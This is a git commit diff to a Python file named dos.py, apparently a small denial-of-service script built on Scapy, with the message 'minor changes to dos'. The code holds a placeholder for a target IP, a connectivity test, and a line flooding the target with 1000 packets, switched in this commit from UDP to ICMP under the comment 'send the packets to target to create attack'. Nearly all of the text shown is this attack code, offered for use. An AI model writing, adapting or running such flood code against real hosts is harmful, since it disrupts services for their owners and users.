44f74b75b33334737128d96ddffe08e8d5c8e93f
CameronSingelton <145766088+CameronSingelton@users.noreply.github.com>
2025-05-11 16:01:01 +0100

    minor changes to dos

--- dos.py
+++ dos.py
@@ -13,7 +13,7 @@ def con_test(ip):
     ans, unans =sr(IP(dst=ip)/ICMP(),timeout=60)
     print(ans,"\n",unans)
 ip = "" # put target ip here 
-if test_flag == 0:
+if test_flag == 1:
     con_test(ip)
 # send the packets to target to create attack
-send(IP(dst=ip)/UDP(),count=1000)
+send(IP(dst=ip)/ICMP(),count=1000)
